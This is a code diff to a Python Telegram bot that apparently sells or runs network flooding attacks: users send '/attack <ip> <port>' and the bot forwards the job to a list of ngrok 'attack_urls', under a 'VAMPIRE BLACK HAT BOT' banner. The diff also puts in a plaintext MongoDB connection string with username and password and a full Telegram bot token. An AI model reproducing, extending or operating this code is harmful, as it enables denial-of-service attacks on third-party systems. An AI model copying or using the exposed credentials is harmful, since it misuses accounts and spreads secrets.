@@ -8,7 +8,7 @@ from pymongo import MongoClient
 from datetime import datetime, timedelta, timezone
 
 # Database Configuration
-MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?re'
+MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
 client = MongoClient(MONGO_URI)
 db = client['TEST']
 users_collection = db['VPS']
@@ -23,13 +23,13 @@ async def get_settings():
     return 10, 9  # Default values if not set
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7682130892:AAE1G9hnnAGXP3WQ'
-ADMIN_USER_ID = 7372592479  # Replace with your admin user ID
+TELEGRAM_BOT_TOKEN = '7253223391:AAFvW9ZnBX3zP4TTnIVgbaFbLtwQUIyRmOc'
+ADMIN_USER_ID = 529691217  # Replace with your admin user ID
 # Replace this with your actual list of URLs
 attack_urls = [
-    "https://6f08-2406-da1a-a27-1600-2110-68a6-431f-4bf9.ngrok-free.app/run_Spike",
-    "https://d853-2406-da1a-a27-1600-7907-36de-2557-7f47.ngrok-free.app/run_Spike",
-    "https://d50b-2406-da1a-a27-1600-2c4c-1e78-8296-161d.ngrok-free.app/run_Spike",
+    "https://4259-18-233-99-222.ngrok-free.app/run_Spike",
+    "https://02b0-3-86-193-212.ngrok-free.app/run_Spike",
+    "https://0033-3-93-144-198.ngrok-free.app/run_Spike",
 ]
 # Track user attacks and cooldowns
 cooldown_dict = {}
@@ -50,7 +50,7 @@ async def start(update: Update, context: CallbackContext):
     message = (
         "*🔥 Welcome to the battlefield! 🔥*\n\n"
            "*Use /attack <ip> <port>*\n"
-              "*🎭BLACK HAT BOT🎭*"
+              "*🎭VAMPIRE BLACK HAT BOT🎭*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
